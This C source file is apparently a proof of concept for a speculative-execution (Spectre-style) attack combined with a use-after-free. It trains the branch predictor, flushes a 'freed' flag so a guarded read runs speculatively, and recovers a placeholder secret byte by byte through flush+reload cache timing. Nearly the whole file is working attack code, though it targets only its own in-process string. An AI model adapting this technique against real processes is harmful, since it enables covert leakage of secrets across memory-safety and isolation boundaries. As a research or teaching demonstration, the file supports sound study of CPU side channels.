#include <stdio.h>
#include <time.h>
#include <stdlib.h>

#include "../lib/gen_array.c"
#include "../lib/time_and_flush.c"
#include "../lib/print_results.c"

#define CACHE_HIT   100
#define N_PAGES     256
#define PAGE_SIZE   4096    //this helps malloc at same location. (page size)

#define REPETITIONS 1000
#define N_TRAINING  10
#define SECRET_SIZE 9
#define SECRET      "mysecret"

#define false       0
#define true        1
#define DBG         false

cp_t* flush_reload_arr;

void* attack_func(int secret_index) {
    int* var0_dupe = malloc(PAGE_SIZE);
    *var0_dupe = secret_index;
    return var0_dupe;
}

/*
 * Variables required in cache:
 * i
 * SECRET
 *
 * Variables required in mem:
 *  freed[0]
 *
 * Training: free_index=1 print_index=0
 * Attack:   free_index=0 print_index={iterate through SECRET}
 */
void victim_func(int free_index, int secret_index) {

    //alloc 2 numbers. put addresses in array to prevent branches (fools branch predictor).
    int  n_vars = 2;
    int* var0 = calloc(1, PAGE_SIZE);
    int* var1 = calloc(1, PAGE_SIZE);
    int* var01_addresses[n_vars];
    var01_addresses[0] = var0;
    var01_addresses[1] = var1;

    //array that tracks which numbers are freed. Default value is false.
    char freed[n_vars] __attribute__ ((aligned (256)));
    freed[0] = false;
    freed[1] = false;

    //free either var0 or var1 depending on the parameter. Branch predictor cannot determine which (no branches).
    int* var0or1_address = var01_addresses[free_index];
    free(var0or1_address);
    freed[free_index] = true;

    //Now that var0 or var1 has been freed. A new allocation of the same size most likely
    //gets the address that was just freed. In the attack scenario, this is var0.
    //The attacker who controls var1 can now overwrite var0 as they please.
    int* var0_dupe = attack_func(secret_index);

    //increase branch history for better accuracy
    for(int i = 0; i < 100; i++) {if(i%2==0) {volatile int x = 0;} else {volatile int x = 1;}}

    //Remove freed[0] from cache, so that the branch will speculatively execute.
    cpuid();
    flush(&freed[0]);
    cpuid();

    if(!freed[0]) {
        //Byte var1 (now equals secret_index) is leaked into the flush+reload array.
        volatile cp_t cp = flush_reload_arr[SECRET[*var0]];
    }

    cpuid();

    //Optional debug print and freeing of allocated memory.
    if(DBG && free_index==0) printf("var0: %p (%d)\toverwrite_addr:%p (%d)\tnew val var0: %d\n", var0, *var0, var0_dupe, *var0_dupe, *var0);
    if(!freed[0]) free(var0);
    if(!freed[1]) free(var1);
    free(var0_dupe);
}

int* prepare(int secret_index) {

    flush_reload_arr = init_flush_reload(N_PAGES);
    flush_arr(flush_reload_arr, N_PAGES);

    //access decisions in array, repeated out-of-bounds not traceable for branch predictor
    int n_accesses = N_TRAINING + 1;
    char free_indices[n_accesses];
    char secret_indices[n_accesses];
    for(int i = 0; i < n_accesses; i++) {
        free_indices[i] = 1;
        secret_indices[i] = 0;
    }
    free_indices[n_accesses-1] = 0;
    secret_indices[n_accesses-1] = secret_index;
    cpuid();

    for(int i = 0; i < n_accesses; i++) {
        victim_func(free_indices[i], secret_indices[i]);
        cpuid();
        if(i < n_accesses-1) {
            cpuid();
            flush_arr(flush_reload_arr, N_PAGES);
        }
        cpuid();
    }

    cpuid();

    //time loading duration per array index
    int* results = reload(flush_reload_arr, N_PAGES, CACHE_HIT);
    free_flush_reload(flush_reload_arr, N_PAGES);
    return results;
}

int main(int argc, char** argv) {
    int*** results = alloc_results(REPETITIONS, SECRET_SIZE, N_PAGES); //results[REPETITIONS][SECRET_SIZE][N_PAGES]ints

    clock_t start2 = clock();

    for(int r = 0; r < REPETITIONS; r++) {
        printf("\nREPETITION %d\n", r);
        for (int s = 0; s < SECRET_SIZE; s++) {
            results[r][s] = prepare(s);
            cpuid();
        }
    }

    clock_t end2 = clock();
    double measured_time = ((double)(end2 - start2))/CLOCKS_PER_SEC;

    print_results(results, REPETITIONS, SECRET, SECRET_SIZE, N_PAGES, CACHE_HIT, measured_time);

    free_results(results, REPETITIONS, SECRET_SIZE);

}